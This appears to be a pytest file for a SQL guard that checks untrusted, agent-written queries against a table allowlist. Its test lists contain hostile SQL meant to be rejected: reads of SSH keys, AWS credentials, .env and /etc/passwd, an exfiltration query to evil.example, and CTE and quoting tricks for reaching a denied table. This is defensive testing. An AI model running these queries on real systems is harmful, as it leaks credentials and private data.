"""Query-guard tests.

Every string in ATTACKS was verified against the *old* regex guard and reached
the connector unchanged (or, in the LEGIT list, was wrongly rejected). Run from
the backend directory so `app` is importable:

    python -m pytest tests/test_queryguard.py -q
"""
import pytest

from app import queryguard
from app.queryguard import QueryRejected, enforce_limit, validate

# The `viewer` policy on `demo`; `customers` is the denied table.
ALLOWED = ["sales", "web_traffic"]


def ok(sql, allowed=ALLOWED):
    return validate(sql, allowed)


def rejected(sql, allowed=ALLOWED):
    with pytest.raises(QueryRejected):
        validate(sql, allowed)


# ── Data sources given as a string literal (replacement scans) ──────────

@pytest.mark.parametrize("sql", [
    "SELECT * FROM 's3://acme-private/payroll.parquet'",
    "SELECT * FROM '/etc/passwd'",
    "SELECT * FROM 'gs://acme-hr/salaries.parquet'",
    "SELECT * FROM 'abfss://c@acct.dfs.core.windows.net/hr.parquet'",
    "SELECT * FROM 'https://evil.example/exfil.parquet'",
    'SELECT * FROM "s3://acme-private/payroll.parquet"',
    "SELECT * FROM sales, 's3://acme-hr/salaries.parquet'",
    "SELECT * FROM sales JOIN \"s3://acme-hr/salaries.parquet\" USING (id)",
    "SELECT * FROM sales UNION ALL SELECT * FROM 's3://hr/pay.parquet'",
    "SELECT * FROM sales JOIN 's3://hr/pay.parquet' ON 1=1",
])
def test_file_and_uri_sources_rejected(sql):
    rejected(sql)


# ── External table/scalar functions, anywhere in the statement ──────────

@pytest.mark.parametrize("fn", [
    "read_parquet", "read_csv", "read_csv_auto", "read_json", "read_json_auto",
    "read_ndjson", "read_text", "read_blob", "parquet_scan", "csv_scan", "glob",
    "sniff_csv", "delta_scan", "iceberg_scan", "postgres_scan", "mysql_scan",
    "sqlite_scan", "arrow_scan", "duckdb_settings", "duckdb_secrets",
    "which_secret", "load_aws_credentials", "current_setting", "query",
])
def test_external_functions_rejected_in_from(fn):
    rejected(f"SELECT * FROM {fn}('s3://acme-hr/salaries.parquet')")


@pytest.mark.parametrize("sql", [
    "SELECT read_text('/Users/rohit/.aws/credentials') AS c FROM sales LIMIT 1",
    "SELECT read_blob('/Users/rohit/.ssh/id_rsa') AS c FROM sales LIMIT 1",
    "SELECT read_text('/Users/rohit/Documents/studio/backend/.env') AS c FROM sales LIMIT 1",
    "SELECT current_setting('s3_secret_access_key') AS k FROM sales LIMIT 1",
    "SELECT CAST(id AS VARCHAR) FROM sales UNION ALL SELECT read_text('/etc/passwd')",
    "SELECT list_transform([1], x -> read_text('/etc/passwd')) FROM sales",
    "SELECT * FROM sales, read_parquet('s3://acme-hr/salaries.parquet')",
    "SELECT * FROM sales WHERE id IN (SELECT id FROM read_csv('/etc/passwd'))",
    # exfiltration: reads a denied table and ships it out in one SELECT
    "SELECT read_text('https://evil.example/x?d=' || (SELECT string_agg(name, ',') "
    "FROM \"customers\")) AS z FROM sales LIMIT 1",
    # quoting the function name does not hide it
    "SELECT \"read_text\"('/etc/passwd') FROM sales",
])
def test_external_functions_rejected_outside_from(sql):
    rejected(sql)


# ── Quoting / comment / comma-join escapes from the table allowlist ─────

@pytest.mark.parametrize("sql", [
    'SELECT * FROM "customers"',
    "SELECT * FROM `hr-prod.people.salaries`",
    "SELECT * FROM [customers]",
    'SELECT * FROM "weird.customers"',
    "SELECT * FROM `proj.region-us`.INFORMATION_SCHEMA.TABLES",
    "SELECT * FROM/**/customers",
    "SELECT * FROM /*x*/ customers",
    "SELECT * FROM (customers)",
    "SELECT * FROM sales, customers",
    "SELECT * FROM sales a, web_traffic b, customers c",
    "SELECT * FROM (PIVOT customers ON a USING sum(b))",
    "SELECT * FROM sales UNION ALL SELECT * FROM customers",
    "SELECT * FROM (SELECT * FROM customers) x",
    "SELECT * FROM sales CROSS JOIN customers",
    "SELECT * FROM sales JOIN customers USING (id)",
    "SELECT * FROM sales WHERE id IN (SELECT id FROM customers)",
    "SELECT * FROM sales WHERE EXISTS (SELECT 1 FROM customers)",
    "SELECT * FROM customers AS c",
    "SELECT * FROM\n\ncustomers",
    "SELECT * FROM\tcustomers",
])
def test_denied_table_rejected(sql):
    rejected(sql)


@pytest.mark.parametrize("sql", [
    "SELECT * FROM sales NATURAL JOIN customers",
    "SELECT * FROM sales POSITIONAL JOIN customers",
    "SELECT * FROM sales ASOF JOIN customers ON 1=1",
    "SELECT * FROM sales SEMI JOIN customers ON 1=1",
    "SELECT * FROM sales CROSS JOIN LATERAL (SELECT * FROM customers)",
    "SELECT * FROM sales, LATERAL (SELECT * FROM customers) x",
    "SELECT (SELECT max(lifetime_value) FROM customers) AS m FROM sales",
    "SELECT * FROM sales WHERE id = ANY(SELECT id FROM customers)",
    "SELECT * FROM ((SELECT * FROM customers)) t",
    'SELECT * FROM "sales" AS s, "customers" AS c',
    "SELECT * FROM sales /* */ , /* */ customers",
    "SELECT * FROM `read_parquet`('s3://x/y.parquet')",
    "TABLE customers",
    "SELECT * FROM ＂customers＂",       # homoglyph quotes: unreadable, so denied
    "SELECT $$a;b$$ FROM sales",         # dollar quoting is not parsed: fails closed
])
def test_exotic_syntax_fails_closed(sql):
    rejected(sql)


# ── CTE poisoning: a forged `name AS (` used to mint a fake CTE ─────────

@pytest.mark.parametrize("sql", [
    "SELECT * FROM customers /*, customers AS ( */",
    "SELECT * FROM customers -- , customers AS (",
    "SELECT ', customers as (' AS n, * FROM customers",
    "SELECT sum(x) OVER w, count(*) OVER c2 FROM customers "
    "WINDOW w AS (ORDER BY 1), customers AS (ORDER BY 1)",
    # a CTE defined AFTER the reference binds nothing for the outer scope
    "SELECT * FROM customers UNION ALL (WITH customers AS (SELECT 1 AS a) "
    "SELECT a FROM customers)",
])
def test_cte_poisoning_rejected(sql):
    rejected(sql)


# ── Statement shape ────────────────────────────────────────────────────

@pytest.mark.parametrize("sql", [
    "SELECT * FROM sales; SELECT 2",
    "SELECT * FROM sales; DROP TABLE customers",
    "SELECT * FROM sales; cr/**/eate TABLE x AS SELECT 1",
    "DROP TABLE sales",
    "INSERT INTO sales VALUES (1)",
    "COPY sales TO '/tmp/x.csv'",
    "INSTALL httpfs",
    "ATTACH 'https://blobs.duckdb.org/x.duckdb' AS st",
    "",
    "   ",
])
def test_non_select_and_multi_statement_rejected(sql):
    rejected(sql)


@pytest.mark.parametrize("sql", [
    "SELECT install FROM sales",
    "SELECT load FROM sales",
    "SELECT * FROM sales WHERE set = 1",
    "SELECT export FROM sales",
    "SELECT import FROM sales",
    "SELECT copy FROM sales",
    "SELECT * FROM sales UNION ALL SELECT * FROM sales attach",
])
def test_forbidden_keywords_as_bare_words_rejected(sql):
    """INSTALL/LOAD/SET/EXPORT/IMPORT/COPY are rejected as bare keywords; a
    column genuinely called `load` can still be quoted (see the accept case)."""
    rejected(sql)


def test_query_with_no_table_reference_rejected():
    """Fail closed: anything we cannot attribute to a permitted table is a
    parser gap, and every gap so far has been a silent allow."""
    rejected("SELECT 1")
    rejected("SELECT current_date")
    rejected("SELECT * FROM (VALUES (1),(2)) t(x)")


# ── Legitimate SQL must still pass ─────────────────────────────────────

@pytest.mark.parametrize("sql", [
    "SELECT * FROM sales",
    "select * from SALES",
    "SELECT * FROM sales;",
    "SELECT * FROM sales ;;;",
    "SELECT city, sum(amount) AS total FROM sales GROUP BY city ORDER BY total DESC",
    "SELECT * FROM sales s JOIN web_traffic w ON s.id = w.session_id",
    "SELECT * FROM sales, web_traffic",
    "SELECT * FROM sales a, web_traffic b WHERE a.id = b.id",
    "SELECT * FROM sales LEFT JOIN web_traffic USING (id)",
    "SELECT * FROM (SELECT * FROM sales) x",
    "SELECT * FROM sales WHERE id IN (SELECT session_id FROM web_traffic)",
    "SELECT sum(amount) OVER (PARTITION BY city ORDER BY d) FROM sales",
    "SELECT sum(x) OVER w FROM sales WINDOW w AS (ORDER BY 1)",
    "SELECT count(*) FILTER (WHERE event = 'insert') FROM web_traffic",
    "SELECT * FROM demo.sales",
    'SELECT * FROM demo."sales"',
    'SELECT * FROM "sales"',
    "SELECT * FROM `sales`",
    'SELECT "created_at", "load" FROM "sales"',
    "SELECT * FROM sales UNION ALL SELECT * FROM web_traffic",
    "(SELECT * FROM sales) UNION ALL (SELECT * FROM web_traffic)",
    "SELECT strftime('%Y-%m-%d', d) AS day, SUM(amount) AS total_amount "
    "FROM sales GROUP BY 1 ORDER BY 1",
    "SELECT max(updated_at) FROM sales",
])
def test_plain_queries_accepted(sql):
    ok(sql)


@pytest.mark.parametrize("sql", [
    "WITH t AS (SELECT * FROM sales) SELECT * FROM t",
    "WITH RECURSIVE t AS (SELECT 1 AS n) SELECT * FROM t",
    "WITH RECURSIVE t AS (SELECT 1 AS n UNION ALL SELECT n + 1 FROM t) SELECT * FROM t",
    "WITH t (a, b) AS (SELECT 1, 2) SELECT * FROM t",
    "WITH t AS MATERIALIZED (SELECT * FROM sales) SELECT * FROM t",
    "WITH t AS NOT MATERIALIZED (SELECT * FROM sales) SELECT * FROM t",
    "WITH a AS (SELECT * FROM sales),\n b AS (SELECT * FROM web_traffic)\n"
    "SELECT * FROM a JOIN b ON a.id = b.id",
    "SELECT * FROM (WITH inner_t AS (SELECT * FROM sales) SELECT * FROM inner_t) y",
    'WITH "t" AS (SELECT * FROM sales) SELECT * FROM "t"',
])
def test_ctes_accepted(sql):
    ok(sql)


@pytest.mark.parametrize("sql", [
    "SELECT * FROM sales WHERE reason = 'material shortage'",
    "SELECT * FROM sales WHERE status = 'create'",
    "SELECT * FROM sales WHERE action IN ('create','delete')",
    "SELECT * FROM sales WHERE note ILIKE '%update%'",
    "SELECT * FROM sales WHERE note = 'a;b'",
    "SELECT a FROM sales WHERE note = 'a;b create' LIMIT 5",
    "SELECT ';' AS sep FROM sales",
    "SELECT 'it''s a drop' AS q FROM sales",
])
def test_string_literals_with_keywords_accepted(sql):
    ok(sql)


@pytest.mark.parametrize("sql", [
    "SELECT created_at, update_ts, deleted_flag, call_count FROM sales",
    "SELECT create_date, copy_count, merged FROM sales",
    "SELECT date_trunc('day', created_at) FROM sales",
    "SELECT s.copy, s.update FROM sales s",
    "SELECT replace(city, ',', '') AS city FROM sales",
    "SELECT truncate(amount) FROM sales",
    "SELECT * REPLACE (amount AS amt) FROM sales",
    'SELECT "copy", "set" FROM sales',
])
def test_identifiers_containing_keywords_accepted(sql):
    ok(sql)


def test_table_named_after_a_keyword_accepted():
    ok("SELECT created_at FROM sales_created", ["sales_created"])
    ok("SELECT * FROM update_log", ["update_log"])


@pytest.mark.parametrize("sql", [
    "/* daily revenue */ SELECT * FROM sales",
    "-- daily revenue\nSELECT * FROM sales",
    "SELECT * FROM sales -- trailing note",
])
def test_comments_accepted_and_stripped(sql):
    cleaned = ok(sql)
    assert "--" not in cleaned and "/*" not in cleaned
    assert "sales" in cleaned


def test_validate_returns_the_sql_that_must_be_executed():
    # The guard must reason about the same text the warehouse runs.
    assert ok("SELECT * FROM/**/sales") == "SELECT * FROM sales"
    assert ok("SELECT * FROM sales") == "SELECT * FROM sales"
    # whitespace/newlines are preserved; only comments are removed
    assert ok("SELECT *\n  FROM sales") == "SELECT *\n  FROM sales"


def test_unterminated_literal_or_comment_rejected():
    rejected("SELECT * FROM sales WHERE x = 'abc")
    rejected("SELECT * FROM sales /* unterminated")


# ── Known residual gap (needs per-connector catalog config to close) ────

def test_cross_database_prefix_is_a_known_gap():
    """RBAC keys on the bare name, so a `db.schema.table` prefix is not checked.
    Closing it needs each connector's own database/schema allowlist, which the
    guard has no access to — documented here so the gap is visible, not silent.
    """
    assert validate("SELECT * FROM secret_db.main.sales", ALLOWED)


# ── enforce_limit ──────────────────────────────────────────────────────

def test_enforce_limit_appends_when_missing():
    assert enforce_limit("SELECT * FROM sales", 500) == "SELECT * FROM sales LIMIT 500"


def test_enforce_limit_respects_an_existing_top_level_limit():
    assert enforce_limit("SELECT * FROM sales LIMIT 10", 500) == "SELECT * FROM sales LIMIT 10"
    assert enforce_limit("SELECT * FROM sales limit 10 OFFSET 5", 500).endswith("OFFSET 5")


def test_enforce_limit_is_not_swallowed_by_a_comment():
    out = enforce_limit("SELECT * FROM sales -- daily", 500)
    assert out == "SELECT * FROM sales LIMIT 500"


def test_enforce_limit_ignores_limit_inside_comments_and_literals():
    assert enforce_limit("SELECT * FROM sales /* limit 1 */", 500) == "SELECT * FROM sales LIMIT 500"
    out = enforce_limit("SELECT * FROM sales WHERE note = 'limit 1'", 500)
    assert out == "SELECT * FROM sales WHERE note = 'limit 1' LIMIT 500"


def test_enforce_limit_ignores_a_limit_nested_in_a_cte():
    sql = "WITH t AS (SELECT * FROM sales LIMIT 10) SELECT * FROM t"
    assert enforce_limit(sql, 500) == sql + " LIMIT 500"


def test_enforce_limit_tolerates_malformed_sql():
    assert "LIMIT 500" in enforce_limit("SELECT * FROM sales WHERE x = 'oops", 500)


# ── Public API other modules depend on ─────────────────────────────────

def test_public_api_surface():
    assert callable(queryguard.validate) and callable(queryguard.enforce_limit)
    assert issubclass(queryguard.QueryRejected, Exception)
    assert hasattr(queryguard.TABLE_REF, "findall")
    assert hasattr(queryguard.FORBIDDEN, "search")


def _refs(sql):
    """How governance, router, pipelines and chat use TABLE_REF."""
    return {r.strip('"').split(".")[-1].lower()
            for r in queryguard.TABLE_REF.findall(sql or "")}


@pytest.mark.parametrize("sql,expected", [
    ("SELECT * FROM customers", {"customers"}),
    ("SELECT * FROM sales JOIN web_traffic ON 1=1", {"sales", "web_traffic"}),
    # widened: these used to yield an EMPTY set, which silently skipped PII
    # masking, deny_columns and row caps in governance.filter_result.
    ('SELECT * FROM "customers"', {"customers"}),
    ("SELECT * FROM/**/customers", {"customers"}),
    ("SELECT * FROM `demo.customers`", {"customers"}),
    ("SELECT * FROM [customers]", {"customers"}),
    ('SELECT * FROM "demo".sales', {"sales"}),
    ("SELECT * FROM demo.sales", {"sales"}),
])
def test_table_ref_still_yields_plain_names(sql, expected):
    assert _refs(sql) == expected


def test_guard_is_linear_on_pathological_input():
    """Agent SQL is untrusted: a backtracking blowup here is a DoS in every
    module that reads table names out of SQL."""
    import time
    for sql in ["from" + " " * 20000 + "!",
                "from" + "/*a*/" * 5000 + "!",
                "from /*" + "*" * 5000 + "/ x"]:
        t = time.time()
        queryguard.TABLE_REF.findall(sql)
        assert time.time() - t < 1.0
    t = time.time()
    assert ok("SELECT * FROM sales " + "/*a*/" * 5000) == "SELECT * FROM sales"
    assert time.time() - t < 1.0


def test_forbidden_still_usable_as_a_raw_text_write_detector():
    # supervisor._WRITE / flow's artifact check call .search() + .group(0)
    assert queryguard.FORBIDDEN.search("DROP TABLE x").group(0).lower() == "drop"
    assert queryguard.FORBIDDEN.search("INSTALL httpfs").group(0).lower() == "install"
    assert queryguard.FORBIDDEN.search("SELECT * FROM sales") is None


def test_dashboards_tile_guard_still_delegates_here():
    from app import dashboards
    assert dashboards.validate_sql("SELECT * FROM sales /* x */", ALLOWED, ["sales", "customers"])
    with pytest.raises(QueryRejected):
        dashboards.validate_sql('SELECT * FROM "customers"', ALLOWED, ["sales", "customers"])


# ── CTE scope confusion (adversarially proven bypass, now closed) ────────

def test_inner_scoped_cte_cannot_launder_an_outer_ref():
    # The inner `customers` CTE is invisible outside t's body; the engine
    # resolves the outer FROM to the real (denied) table. Proven PII leak.
    with pytest.raises(QueryRejected):
        ok("WITH t AS (WITH customers AS (SELECT 1) SELECT 1) SELECT * FROM customers")


def test_subquery_scoped_cte_cannot_launder_a_sibling_join():
    with pytest.raises(QueryRejected):
        ok("SELECT * FROM (WITH customers AS (SELECT 1 AS id) SELECT id FROM customers) t "
           "JOIN customers c ON c.id = t.id")


def test_non_recursive_self_reference_resolves_to_the_base_table():
    # Postgres/DuckDB non-recursive scoping sends the inner ref to the BASE
    # table, so the guard must not treat it as the CTE.
    with pytest.raises(QueryRejected):
        ok("WITH customers AS (SELECT * FROM customers) SELECT * FROM customers")


def test_recursive_self_reference_is_the_cte_itself():
    ok("WITH RECURSIVE nums AS (SELECT 1 AS n UNION ALL SELECT n + 1 FROM nums WHERE n < 5) "
       "SELECT * FROM nums JOIN sales ON 1 = 1")


def test_nested_with_inside_a_subquery_still_works_inside_its_scope():
    ok("SELECT * FROM (WITH s AS (SELECT * FROM sales) SELECT * FROM s) t")


def test_shadowing_an_allowed_table_still_works():
    ok("WITH sales AS (SELECT * FROM sales) SELECT * FROM sales")


def test_sibling_cte_may_reference_an_earlier_one():
    ok("WITH a AS (SELECT * FROM sales), b AS (SELECT * FROM a) SELECT * FROM b")


def test_select_into_is_rejected():
    with pytest.raises(QueryRejected):
        ok("SELECT * INTO evil FROM sales")
